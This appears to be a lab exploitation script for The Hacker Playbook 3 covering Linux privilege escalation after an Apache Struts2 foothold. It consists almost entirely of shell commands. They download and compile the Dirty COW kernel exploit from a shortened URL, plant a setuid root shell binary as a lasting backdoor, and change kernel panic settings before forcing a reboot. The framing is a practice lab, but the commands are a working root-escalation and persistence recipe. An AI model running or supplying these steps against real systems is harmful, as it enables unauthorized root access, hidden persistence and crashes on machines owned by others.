#Apache Struts2 Lab PrivEsc Exploit for THP3 lab

#Download the dirtycow exploit and compile the binary
cd /tmp
wget http://bit.ly/2dVlw4Z -O dirtycow-mem.c
gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
./dirtycow-mem

#Next we need to turn dirty_writeback_centisecs off to make the exploit more stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs

#Before the exploit crashes, we are going to create a little binary that abuses the setuid and stickeybit to run and execute /bin/bash as root.
cd /home/
wget https://bit.ly/2IQEqZG -O a.c
gcc -o a a.c
chown root a
chmod +s a
ls -alh

#Set Kernel panic to reboot versus freeze the system
echo 1 > /proc/sys/kernel/panic && echo 1 > /proc/sys/kernel/panic_on_oops&& echo 1 > /proc/sys/kernel/panic_on_unrecovered_nmi && echo 1 > /proc/sys/kernel/panic_on_io_nmi && echo 1 > /proc/sys/kernel/panic_on_warn

#Exit to save the binary 
exit

#Use our privesc binary to go from a limited uesr to root and reboot
/home/a
reboot -f

#Now anytime you want to go back to root, run the command:
/home/a
